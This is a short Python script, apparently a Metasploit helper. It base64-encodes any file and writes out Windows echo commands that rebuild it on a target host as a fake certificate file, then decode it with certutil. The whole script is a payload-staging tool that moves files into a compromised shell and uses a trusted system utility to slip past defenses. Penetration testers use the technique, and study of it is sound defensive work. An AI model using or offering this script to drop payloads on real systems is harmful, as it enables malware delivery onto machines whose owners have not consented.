import sys
import base64


if len(sys.argv) < 5:
    print("Usage : ./script_metasploit_cmds [to_upload] [out] [temp_file] [final_file] (block_size)")
    exit()
elif len(sys.argv) > 5:
    block_size = int(sys.argv[5])
else:
    block_size = 300

for i in range(len(sys.argv)):
    sys.argv[i] = sys.argv[i].replace('\\','\\\\')

f = base64.b64encode(open(sys.argv[1],'rb').read())

with open(sys.argv[2], 'wb+') as g:
    g.write("echo -----BEGIN CERTIFICATE----->"+sys.argv[3]+"\n")
    for i in range(0, len(f), block_size):
        g.write("echo "+f[i:i+block_size]+">>"+sys.argv[3]+"\n")
    g.write("echo -----END CERTIFICATE----->>"+sys.argv[3]+"\n")
    g.write("type "+sys.argv[3]+"\n")
    g.write("certutil -decode "+sys.argv[3]+" "+sys.argv[4]+"\n")
